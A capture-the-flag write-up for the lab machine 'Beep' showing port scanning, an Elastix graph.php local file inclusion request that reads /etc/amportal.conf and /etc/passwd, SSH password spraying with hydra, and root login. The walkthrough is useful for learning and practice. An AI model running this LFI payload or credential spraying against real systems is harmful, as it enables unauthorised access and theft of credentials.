## Initial NMAP:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ nmap 10.129.229.183 -T4                
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-21 10:46 +0545
Nmap scan report for 10.129.229.183
Host is up (0.29s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 32.68 seconds
```

A lot going overhere :V I always love to start with port 80, so let's go:

## Enumerating Port 80:

Visiting the IP address on the browser, we are greeted with a login page, we can see that it's login portal of Elastix, Let's start with searching Elastix's exploit.

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ searchsploit elastix
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                         | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                       | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                 | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                              | php/webapps/37637.pl
```

Let's try out `php/webapps/37637.pl` which is LFI, now:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ curl "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" --insecure                     60 ⨯
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

We got some passwords which we can spray on, let's try to find which users can ssh into system and use the credentials we got from the LFI:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ curl "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" --insecure|grep sh$|cut -d ":" -f1
root
mysql
cyrus
asterisk
spamfilter
fanis                                                
```
Alright, we got 6 users, let's fire up our hydra:
```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ hydra -L users.txt -P pass.txt ssh://10.129.229.183
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-21 11:19:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:6/p:3), ~2 tries per task
[DATA] attacking ssh://10.129.229.183:22/
[22][ssh] host: 10.129.229.183   login: root   password: jEhdIekWmdjE
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-21 11:19:36
```
Yay, we got the password for root, let's try to ssh into the system:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Beep]
└─$ ssh root@10.129.229.183
root@10.129.229.183's password: 
Last login: Wed Nov 15 12:55:38 2023

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.229.183

[root@beep ~]# find / -name user.txt -exec cat {} \; -o -name root.txt -exec cat {} \;

80e1c01535b8fdb9a50d3641b4bf9eb5
4649e2df475eca13299cba8abc8b9c84
```

# Takeaways:
- Gather everything and try it everywhere where it makes sense.